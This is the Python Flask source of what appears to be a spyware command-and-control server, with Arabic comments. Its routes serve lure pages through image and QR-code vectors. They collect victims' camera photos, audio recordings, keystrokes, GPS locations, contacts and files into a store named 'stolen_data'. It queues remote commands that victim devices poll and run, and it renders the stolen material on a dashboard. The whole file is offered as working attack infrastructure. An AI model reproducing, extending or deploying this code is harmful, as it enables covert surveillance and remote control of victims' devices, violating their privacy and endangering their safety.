from flask import Flask, render_template, request, jsonify, send_from_directory
import os
import json
import base64
import threading
import time
from datetime import datetime

app = Flask(__name__)

# ========== تخزين البيانات ==========
stolen_data = {
    "photos": [],
    "audio": [],
    "keylogs": [],
    "locations": [],
    "contacts": [],
    "files": []
}

# ========== الصفحات الرئيسية ==========
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/image')
def image_vector():
    return render_template('image.html')

@app.route('/qr')
def qr_vector():
    return render_template('qr.html')

# ========== لوحة التحكم (Dashboard) ==========
@app.route('/dashboard')
def dashboard():
    return render_template('dashboard.html')

@app.route('/api/dashboard/data')
def dashboard_data():
    """API تعيد جميع البيانات المسروقة للوحة التحكم"""
    return jsonify(stolen_data)

# ========== استقبال البيانات من الضحية ==========
@app.route('/api/upload', methods=['POST'])
def upload_data():
    data = request.json
    if not data:
        return jsonify({"status": "error", "message": "No data"}), 400
    
    data_type = data.get('type')
    content = data.get('content')
    timestamp = datetime.now().isoformat()
    
    record = {
        "timestamp": timestamp,
        "ip": request.remote_addr,
        "user_agent": request.headers.get('User-Agent', 'unknown'),
        "content": content
    }
    
    if data_type == 'photo':
        stolen_data["photos"].append(record)
    elif data_type == 'audio':
        stolen_data["audio"].append(record)
    elif data_type == 'keylog':
        stolen_data["keylogs"].append(record)
    elif data_type == 'location':
        stolen_data["locations"].append(record)
    elif data_type == 'contacts':
        stolen_data["contacts"].append(record)
    elif data_type == 'file':
        stolen_data["files"].append(record)
    
    return jsonify({"status": "ok"})

@app.route('/api/upload/photo', methods=['POST'])
def upload_photo():
    """استقبال الصور كـ base64"""
    data = request.json
    if not data or 'image' not in data:
        return jsonify({"status": "error"}), 400
    
    stolen_data["photos"].append({
        "timestamp": datetime.now().isoformat(),
        "ip": request.remote_addr,
        "user_agent": request.headers.get('User-Agent', 'unknown'),
        "content": data['image'][:100] + "...[BASE64_TRUNCATED]",
        "camera": data.get('camera', 'unknown'),
        "full_image": data['image']
    })
    return jsonify({"status": "ok"})

@app.route('/api/upload/location', methods=['POST'])
def upload_location():
    data = request.json
    if not data:
        return jsonify({"status": "error"}), 400
    
    stolen_data["locations"].append({
        "timestamp": datetime.now().isoformat(),
        "ip": request.remote_addr,
        "lat": data.get('lat'),
        "lng": data.get('lng'),
        "accuracy": data.get('accuracy')
    })
    return jsonify({"status": "ok"})

@app.route('/api/upload/contacts', methods=['POST'])
def upload_contacts():
    data = request.json
    if not data:
        return jsonify({"status": "error"}), 400
    
    stolen_data["contacts"].append({
        "timestamp": datetime.now().isoformat(),
        "ip": request.remote_addr,
        "contacts": data.get('contacts', [])
    })
    return jsonify({"status": "ok"})

@app.route('/api/upload/keylog', methods=['POST'])
def upload_keylog():
    data = request.json
    if not data:
        return jsonify({"status": "error"}), 400
    
    stolen_data["keylogs"].append({
        "timestamp": datetime.now().isoformat(),
        "ip": request.remote_addr,
        "keys": data.get('keys', '')
    })
    return jsonify({"status": "ok"})

@app.route('/api/upload/audio', methods=['POST'])
def upload_audio():
    data = request.json
    if not data or 'audio' not in data:
        return jsonify({"status": "error"}), 400
    
    stolen_data["audio"].append({
        "timestamp": datetime.now().isoformat(),
        "ip": request.remote_addr,
        "duration": data.get('duration', 'unknown'),
        "full_audio": data['audio']
    })
    return jsonify({"status": "ok"})

# ========== أوامر التحكم (من اللوحة إلى الضحية) ==========
# قائمة الأوامر المعلقة
pending_commands = []

@app.route('/api/command/send', methods=['POST'])
def send_command():
    """إرسال أمر من لوحة التحكم إلى الضحية"""
    data = request.json
    if not data or 'type' not in data:
        return jsonify({"status": "error", "message": "Missing command type"}), 400
    
    command = {
        "id": str(len(pending_commands) + 1),
        "type": data['type'],
        "params": data.get('params', {}),
        "timestamp": datetime.now().isoformat()
    }
    pending_commands.append(command)
    return jsonify({"status": "ok", "command_id": command["id"]})

@app.route('/api/command/poll')
def poll_commands():
    """الضحية تسأل: هل هناك أوامر جديدة؟"""
    if pending_commands:
        cmd = pending_commands.pop(0)
        return jsonify({"command": cmd})
    return jsonify({"command": None})

@app.route('/api/command/status', methods=['POST'])
def command_status():
    """الضحية تخبرنا بنتيجة تنفيذ الأمر"""
    data = request.json
    print(f"[Command Result] {data}")
    return jsonify({"status": "ok"})

# ========== عرض البيانات المسروقة ==========
@app.route('/stolen/<category>')
def view_stolen(category):
    if category in stolen_data:
        items = stolen_data[category]
        html = f"<h1>{category.upper()} - {len(items)} items</h1><hr>"
        for i, item in enumerate(items):
            html += f"<div style='border:1px solid #ccc; margin:10px; padding:10px;'>"
            html += f"<b>#{i+1}</b> | Time: {item.get('timestamp', 'N/A')}<br>"
            if category == 'photos' and 'full_image' in item:
                html += f'<img src="data:image/jpeg;base64,{item["full_image"]}" style="max-width:300px"/><br>'
            elif category == 'locations':
                lat, lng = item.get('lat'), item.get('lng')
                if lat and lng:
                    html += f'📍 <a href="https://www.google.com/maps?q={lat},{lng}" target="_blank">{lat}, {lng}</a>'
            elif category == 'keylogs':
                html += f"Keys: <pre>{item.get('keys', '')}</pre>"
            elif category == 'contacts':
                contacts = item.get('contacts', [])
                html += f"Contacts: {len(contacts)} entries<br>"
                for c in contacts[:5]:
                    html += f"- {c.get('name', 'N/A')}: {c.get('phone', 'N/A')}<br>"
            html += "</div>"
        return html
    return f"<h1>Category '{category}' not found</h1>", 404

# ========== تشغيل السيرفر ==========
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=True)
else:
    # للإنتاج على Render
    port = int(os.environ.get('PORT', 5000))
